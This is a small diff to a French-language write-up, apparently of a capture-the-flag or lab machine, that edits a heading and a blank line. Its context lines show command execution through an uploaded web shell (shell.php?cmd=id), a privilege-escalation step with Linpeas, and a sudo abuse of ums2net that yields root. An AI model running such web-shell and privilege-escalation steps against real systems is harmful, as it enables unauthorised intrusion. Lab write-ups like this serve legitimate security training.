@@ -95,7 +95,7 @@ curl "http://192.168.188.214/shell.php?cmd=id"
 
 ## 5. Élévation de Privilèges
 
-### 5.1. Analyse avec Linpeas et PSPY  
+### 5.1. Analyse avec Linpeas
 Téléchargement et exécution de **Linpeas** pour identifier des vulnérabilités d’élévation de privilèges.
 
 ```bash
@@ -129,7 +129,6 @@ sudo /usr/sbin/ums2net -c /tmp/config -d
 ```
 
 ![image12](https://github.com/user-attachments/assets/5fea9bec-9da2-4d45-9fd5-3af7f592c215)
-
 
 ✅ **Accès root obtenu** via l’utilisateur **"aurelien"**.
 
